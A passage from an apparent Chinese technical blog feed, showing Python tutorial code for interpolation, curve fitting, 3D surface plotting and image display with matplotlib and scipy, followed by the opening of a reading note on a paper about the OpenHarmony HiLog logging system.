class="number">0.7</span>))</span><br><span class="line"></span><br><span class="line">axe2.set_ylabel(<span class="string">&#x27;Total Compressed Ratio&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axe.set_title(<span class="string">&#x27;Dict Size Ratio &amp; Compressed Ratio Relationship&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/dict2.png" width="400px" /></p><h3 id="0-3-3-样条曲线和插值拟合"><a href="#0-3-3-样条曲线和插值拟合" class="headerlink" title="0.3.3 样条曲线和插值拟合"></a>0.3.3 样条曲线和插值拟合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: fit_interp_1d.py</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> interpolate</span><br><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> curve_fit</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Union</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Interpolate1DGen</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x: <span class="type">List</span>[<span class="built_in">float</span>], y: <span class="type">List</span>[<span class="built_in">float</span>], point_cnt: <span class="built_in">int</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.point_cnt = point_cnt</span><br><span class="line">        self.sorted_x = <span class="built_in">sorted</span>(self.x)</span><br><span class="line">        self.sorted_y = <span class="built_in">sorted</span>(self.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">interpolate_polynomial</span>(<span class="params">self, kind: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Polynomial interpolate for 1D data.</span></span><br><span class="line"><span class="string">        :param kind: &#x27;nearest&#x27;, &#x27;zero&#x27;, &#x27;linear&#x27;, &#x27;slinear&#x27;, &#x27;quadratic&#x27;(2), &#x27;cubic&#x27;(3), 4, 5, ...</span></span><br><span class="line"><span class="string">        :return: tuple(interpolated_x, interpolated_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ans_x = np.linspace(</span><br><span class="line">            self.sorted_x[<span class="number">0</span>],</span><br><span class="line">            self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>],</span><br><span class="line">            self.point_cnt</span><br><span class="line">        )</span><br><span class="line">        f_linear = interpolate.interp1d(</span><br><span class="line">            self.x, self.y, kind=kind</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> ans_x, f_linear(ans_x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">interpolate_B_spline</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        B-spline interpolate for 1D data.</span></span><br><span class="line"><span class="string">        **WARNING**: Data sort and non-duplicated will be needed.</span></span><br><span class="line"><span class="string">        :return: tuple(interpolated_x, interpolated_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ans_x = np.linspace(</span><br><span class="line">            self.sorted_x[<span class="number">0</span>],</span><br><span class="line">            self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>],</span><br><span class="line">            self.point_cnt</span><br><span class="line">        )</span><br><span class="line">        tck = interpolate.splrep(self.sorted_x, self.sorted_y)</span><br><span class="line">        y_bSpline = interpolate.splev(ans_x, tck)</span><br><span class="line">        <span class="keyword">return</span> ans_x, y_bSpline</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FitLine1DGen</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x: <span class="type">List</span>[<span class="built_in">float</span>], y: <span class="type">List</span>[<span class="built_in">float</span>], point_cnt: <span class="built_in">int</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.point_cnt = point_cnt</span><br><span class="line">        self.sorted_x = <span class="built_in">sorted</span>(self.x)</span><br><span class="line">        self.sorted_y = <span class="built_in">sorted</span>(self.y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S-shape curve fit.</span></span><br><span class="line">    <span class="comment"># Or logistic model.</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">x, lp, x0, k, b</span>):</span><br><span class="line">        y = lp / (<span class="number">1</span> + np.exp(-k * (x - x0))) + b</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit_polynomial_curve</span>(<span class="params">self, n: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Polynomial fitting for 1D data.</span></span><br><span class="line"><span class="string">        :param n: (int) the max power of the polynomial.</span></span><br><span class="line"><span class="string">        :return: tuple(fitting_curve_x, fitting_curve_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = np.polyfit(self.x, self.y, n)</span><br><span class="line">        ans_x = np.linspace(</span><br><span class="line">            self.sorted_x[<span class="number">0</span>],</span><br><span class="line">            self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>],</span><br><span class="line">            self.point_cnt</span><br><span class="line">        )</span><br><span class="line">        ans_y = np.polyval(params, ans_x)</span><br><span class="line">        <span class="keyword">return</span> ans_x, ans_y</span><br><span class="line"></span><br><span class="line">    <span class="comment"># logistic fit</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit_S_curve</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        S Curve fitting for 1D data.</span></span><br><span class="line"><span class="string">        :return: tuple(fitting_curve_x, fitting_curve_y)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># standardize data:</span></span><br><span class="line">        x_min = self.sorted_x[<span class="number">0</span>]</span><br><span class="line">        y_min = self.sorted_y[<span class="number">0</span>]</span><br><span class="line">        x_max = self.sorted_x[<span class="built_in">len</span>(self.x)-<span class="number">1</span>]</span><br><span class="line">        y_max = self.sorted_y[<span class="built_in">len</span>(self.y)-<span class="number">1</span>]</span><br><span class="line">        x_zoomed = (np.array(self.x) - x_min) / (x_max - x_min)</span><br><span class="line">        y_zoomed = (np.array(self.y) - y_min) / (y_max - y_min)</span><br><span class="line">        <span class="comment"># A mandatory initial guess</span></span><br><span class="line">        <span class="comment"># [max(yData), median(xData), 1, min(yData)]</span></span><br><span class="line">        p_guess = [</span><br><span class="line">            <span class="built_in">max</span>(y_zoomed), np.median(x_zoomed),</span><br><span class="line">            <span class="number">1</span>, <span class="built_in">min</span>(y_zoomed)</span><br><span class="line">        ]</span><br><span class="line">        popt, pcov = curve_fit(</span><br><span class="line">            self.sigmoid, x_zoomed, y_zoomed,</span><br><span class="line">            p_guess</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[INFO] curve_fit: popt = &quot;</span>, popt)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[INFO] curve_fit: pcov = &quot;</span>, pcov)</span><br><span class="line"></span><br><span class="line">        fit_x = np.linspace(<span class="number">0</span>, <span class="number">1</span>, self.point_cnt)</span><br><span class="line">        fit_y = self.sigmoid(fit_x, popt[<span class="number">0</span>], popt[<span class="number">1</span>], popt[<span class="number">2</span>], popt[<span class="number">3</span>])</span><br><span class="line">        ans_x = fit_x * (x_max - x_min) + x_min</span><br><span class="line">        ans_y = fit_y * (y_max - y_min) + y_min</span><br><span class="line">        <span class="keyword">return</span> ans_x, ans_y</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fit_interp_1d <span class="keyword">import</span> Interpolate1DGen</span><br><span class="line"></span><br><span class="line">element_test_list = [<span class="number">50</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">500</span>, <span class="number">1000</span>]</span><br><span class="line">p_test_list = [<span class="number">1</span> / <span class="number">2</span>, <span class="number">1</span> / math.e, <span class="number">1</span> / <span class="number">4</span>, <span class="number">1</span> / <span class="number">8</span>, <span class="number">1</span> / <span class="number">16</span>]</span><br><span class="line">ans = [[<span class="number">8.75</span>, <span class="number">7.45</span>, <span class="number">5.48</span>, <span class="number">5.3</span>, <span class="number">4.92</span>],</span><br><span class="line">       [<span class="number">8.98</span>, <span class="number">7.67</span>, <span class="number">6.19</span>, <span class="number">5.58</span>, <span class="number">6.89</span>],</span><br><span class="line">       [<span class="number">9.72</span>, <span class="number">8.25</span>, <span class="number">6.35</span>, <span class="number">5.53</span>, <span class="number">10.33</span>],</span><br><span class="line">       [<span class="number">11.67</span>, <span class="number">9.22</span>, <span class="number">8.39</span>, <span class="number">8.81</span>, <span class="number">9.52</span>],</span><br><span class="line">       [<span class="number">12.83</span>, <span class="number">10.17</span>, <span class="number">8.56</span>, <span class="number">9.26</span>, <span class="number">10.71</span>]]</span><br><span class="line"></span><br><span class="line">style_list = [<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;-.&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;:&#x27;</span>]</span><br><span class="line">color_list = [<span class="string">&#x27;#04acf4&#x27;</span>, <span class="string">&#x27;#ff5722&#x27;</span>, <span class="string">&#x27;#ffeb3b&#x27;</span>, <span class="string">&#x27;#4caf50&#x27;</span>, <span class="string">&#x27;#9c27b0&#x27;</span>]</span><br><span class="line">inter_sample_cnt = <span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> idx, elem <span class="keyword">in</span> <span class="built_in">enumerate</span>(element_test_list):</span><br><span class="line">    aqd = ans[idx]</span><br><span class="line">    ans_p, ans_aqd = Interpolate1DGen(</span><br><span class="line">        p_test_list, aqd, inter_sample_cnt</span><br><span class="line">    ).interpolate_polynomial(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># plt.scatter(ans_p, ans_aqd, color=&#x27;k&#x27;, marker=&#x27;x&#x27;)</span></span><br><span class="line">    plt.plot(ans_p, ans_aqd, color=color_list[idx], linestyle=style_list[idx])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Probability $p$&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Average Query Distance (AQD)&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;The curves for AQD-probability&#x27;</span>)</span><br><span class="line">plt.minorticks_on()</span><br><span class="line">plt.grid()</span><br><span class="line">plt.legend(</span><br><span class="line">    labels=(</span><br><span class="line">        <span class="string">&#x27;element: 50&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 100&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 200&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 500&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;element: 1000&#x27;</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/AQD_curves.png" width="400px" /></p><h3 id="0-3-4-3D-曲面"><a href="#0-3-4-3D-曲面" class="headerlink" title="0.3.4 3D 曲面"></a>0.3.4 3D 曲面</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu0 = <span class="number">4</span> * math.pi * <span class="number">10</span> ** (-<span class="number">3</span>)</span><br><span class="line">N = <span class="number">310</span></span><br><span class="line">R = <span class="number">0.14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i unit: A</span></span><br><span class="line"><span class="comment"># B unit: 1 Gauss = 10 ** -4 Tesla</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">I2B</span>(<span class="params">i: <span class="built_in">float</span>, x: <span class="built_in">float</span></span>):</span><br><span class="line">    p1 = mu0 * N * math.<span class="built_in">pow</span>(R, <span class="number">2</span>) * i /(<span class="number">2</span> * math.<span class="built_in">pow</span>(math.<span class="built_in">pow</span>(R, <span class="number">2</span>) + math.<span class="built_in">pow</span>(R / <span class="number">2</span> + x, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>))</span><br><span class="line">    p2 = mu0 * N * math.<span class="built_in">pow</span>(R, <span class="number">2</span>) * i /(<span class="number">2</span> * math.<span class="built_in">pow</span>(math.<span class="built_in">pow</span>(R, <span class="number">2</span>) + math.<span class="built_in">pow</span>(R / <span class="number">2</span> - x, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> p1 + p2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">theoB</span>(<span class="params">th_B0: <span class="built_in">float</span>, x: <span class="built_in">float</span></span>):</span><br><span class="line">    <span class="keyword">return</span> th_B0 * math.<span class="built_in">pow</span>(<span class="number">5</span>, <span class="number">3</span> / <span class="number">2</span>) / <span class="number">16</span> * (<span class="number">1</span> / math.<span class="built_in">pow</span>(<span class="number">1</span> + math.<span class="built_in">pow</span>(<span class="number">0.5</span> + x / R, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>) + <span class="number">1</span> / math.<span class="built_in">pow</span>(<span class="number">1</span> + math.<span class="built_in">pow</span>(<span class="number">0.5</span> - x / R, <span class="number">2</span>), <span class="number">3</span> / <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p_cnt = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    axe = plt.axes(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">    plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span>  <span class="comment"># 用来正常显示负号</span></span><br><span class="line">    xx = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line">    yy = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">    mesh_val = [</span><br><span class="line">        [<span class="number">1.025</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.023</span>, <span class="number">1.020</span>, <span class="number">1.016</span>],  <span class="comment"># y = 0</span></span><br><span class="line">        [<span class="number">1.025</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.023</span>, <span class="number">1.020</span>, <span class="number">1.016</span>],  <span class="comment"># y = 0.05R</span></span><br><span class="line">        [<span class="number">1.024</span>, <span class="number">1.027</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.023</span>, <span class="number">1.022</span>, <span class="number">1.018</span>],  <span class="comment"># y = 0.10R</span></span><br><span class="line">        [<span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.024</span>, <span class="number">1.025</span>, <span class="number">1.024</span>, <span class="number">1.021</span>],  <span class="comment"># y = 0.15R</span></span><br><span class="line">        [<span class="number">1.023</span>, <span class="number">1.023</span>, <span class="number">1.024</span>, <span class="number">1.025</span>, <span class="number">1.027</span>, <span class="number">1.026</span>, <span class="number">1.024</span>],  <span class="comment"># y = 0.20R</span></span><br><span class="line">        [<span class="number">1.021</span>, <span class="number">1.021</span>, <span class="number">1.023</span>, <span class="number">1.026</span>, <span class="number">1.028</span>, <span class="number">1.030</span>, <span class="number">1.030</span>],  <span class="comment"># y = 0.25R</span></span><br><span class="line">        [<span class="number">1.018</span>, <span class="number">1.019</span>, <span class="number">1.021</span>, <span class="number">1.027</span>, <span class="number">1.031</span>, <span class="number">1.033</span>, <span class="number">1.037</span>]   <span class="comment"># y = 0.30R</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">U2B</span>(<span class="params">u: <span class="built_in">float</span></span>):</span><br><span class="line">        <span class="keyword">return</span> (u - <span class="number">4.61538</span> * math.<span class="built_in">pow</span>(<span class="number">10</span>, -<span class="number">4</span>)) / <span class="number">0.25396</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Z_func</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">return</span> mesh_val[x][y]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mesh_val)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mesh_val[<span class="number">0</span>])):</span><br><span class="line">            mesh_val[i][j] = U2B(mesh_val[i][j])</span><br><span class="line"></span><br><span class="line">    rawX, rawY = np.meshgrid(xx, yy)</span><br><span class="line"></span><br><span class="line">    ap_all = np.vectorize(Z_func)</span><br><span class="line">    Z = ap_all(rawX, rawY)</span><br><span class="line">    <span class="built_in">print</span>(Z)</span><br><span class="line"></span><br><span class="line">    toReal = np.vectorize(<span class="keyword">lambda</span> x: x * <span class="number">0.05</span> * R)</span><br><span class="line">    rxx = toReal(xx)</span><br><span class="line">    ryy = toReal(yy)</span><br><span class="line">    X, Y = np.meshgrid(rxx, ryy)</span><br><span class="line"></span><br><span class="line">    axe.plot_surface(X, Y, Z, cmap=<span class="string">&#x27;jet&#x27;</span>)</span><br><span class="line">    axe.plot_wireframe(X, Y, Z, color=<span class="string">&#x27;k&#x27;</span>, linewidth=<span class="number">0.3</span>)</span><br><span class="line">    <span class="comment"># axe.minorticks_on()</span></span><br><span class="line">    axe.set_xlabel(<span class="string">&#x27;X position ($m$)&#x27;</span>)</span><br><span class="line">    axe.set_ylabel(<span class="string">&#x27;Y position ($m$)&#x27;</span>)</span><br><span class="line">    axe.set_zlabel(<span class="string">&#x27;Magnetic field density B ($G$)&#x27;</span>)</span><br><span class="line">    axe.set_title(<span class="string">&#x27;Space magnetic field distribution&#x27;</span>)</span><br><span class="line">    axe.grid(which=<span class="string">&quot;major&quot;</span>, alpha=<span class="number">0.6</span>)</span><br><span class="line">    axe.grid(which=<span class="string">&quot;minor&quot;</span>, alpha=<span class="number">0.3</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/AQD.png" width="400px" /></p><h3 id="0-3-5-输出图片"><a href="#0-3-5-输出图片" class="headerlink" title="0.3.5 输出图片"></a>0.3.5 输出图片</h3><p>除了使用 OpenCV 库的 <code>imshow</code>，Matplotlib 也支持输出图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> cv2 <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = imread(<span class="string">&#x27;assets/cat.jpg&#x27;</span>)</span><br><span class="line">img_tinted = img * [<span class="number">1</span>, <span class="number">0.95</span>, <span class="number">0.9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show the original image</span></span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show the tinted image</span></span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A slight gotcha with imshow is that it might give strange results</span></span><br><span class="line"><span class="comment"># if presented with data that is not uint8. To work around this, we</span></span><br><span class="line"><span class="comment"># explicitly cast the image to uint8 before displaying it.</span></span><br><span class="line">plt.imshow(np.uint8(img_tinted))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0-1-NumPy&quot;&gt;&lt;a href=&quot;#0-1-NumPy&quot; class=&quot;headerlink&quot; title=&quot;0.1 NumPy&quot;&gt;&lt;/a&gt;0.1 NumPy&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Numpy&lt;/code&gt; 库是 Python 科学计算的核心。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Math" scheme="https://blog.sjtuxhw.top/tags/Math/"/>
    
    <category term="Python" scheme="https://blog.sjtuxhw.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OpenHarmony Hilog 架构趣读</title>
    <link href="https://blog.sjtuxhw.top/technical/hilog-paper/"/>
    <id>https://blog.sjtuxhw.top/technical/hilog-paper/</id>
    <published>2024-10-29T05:14:04.000Z</published>
    <updated>2024-10-31T05:22:11.134Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到一篇讨论 OpenHarmony Hilog 日志子系统的设计的论文，遂进行了一番阅读。该论文发表在软件学报上。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ol><li>分析当今主流日志系统的技术架构和优缺点；</li><li>基于 <code>OpenHarmony</code> 操作系统的异构设备互联特性，设计 <code>HiLog</code> 日志系统模型规范；</li><li>设计并实现第 1 个面向 <code>OpenHarmony</code> 的日志系统 <code>HiLog</code>, 并贡献到 <code>OpenHarmony</code> 主线；</li><li>对 <code>HiLog</code> 日志系统的关键指标进行测试和对比试验；</li></ol><p>实现的 <code>HiLog</code> 具有以下特征：</p><ul><li>基础性能：日志写入阶段吞吐量分别为 1 500 KB/s 和 700 KB/s，吞吐量相对 Android Log 提升 114%；</li><li>日志持久化：压缩率 3.5%，丢包率 0.6%；</li><li>数据安全、流量控制等等新型实用能力；</li></ul><h2 id="背景概述"><a href="#背景概述" class="headerlink" title="背景概述"></a>背景概述</h2><p>地位：在计算机系统中，日志作为一种基于时间序列的数据，记录了在操作系统中发生的事件或其他软件运行的事件。</p><p>作用：</p><ul><li>实用价值：系统开发和运维人员需要通过日志对程序中存在的问题进行定位和分析，提高工作效率；</li><li>商业价值：日志记录了大量用户行为习惯信息，这些信息通过大数据分析可用于了解用户需求，作为改进产品或孵化新的商业项目的依据；</li></ul><p>目前产业界的日志系统：Android Log、FTrace、NanoLog、Log4j2 等等；</p><p><code>OpenHarmony</code> 日志系统需要具备的功能：生成、过滤、记录和消息分析的能力。</p><ul><li>多进程日志读写：<code>OpenHarmony</code> 是支持多进程并发的操作系统，其日志系统需要具备从多进程收集日志的能力；</li><li>实时日志读写：作为操作系统的高效调试辅助工具，日志系统需要具备<strong><u>事件发生-日志输出</u></strong>的实时响应能力；</li><li>多内核适配：<code>OpenHarmony</code> 是多内核的操作系统，其日志系统需要具备多种内核适配能力；</li></ul><p>经过分析，目前产业界的日志系统均不适合 <code>OpenHarmony</code>：</p><ul><li><p><code>Log4j2</code> 单进程日志架构；</p><ul><li>借助 CAS 实现缓冲区加解锁，降低日志读写接口的延时；</li><li>缓存行填充解决伪共享问题，隔离更新操作，进一步提升运行效率；</li><li>CAS 方法的 CPU 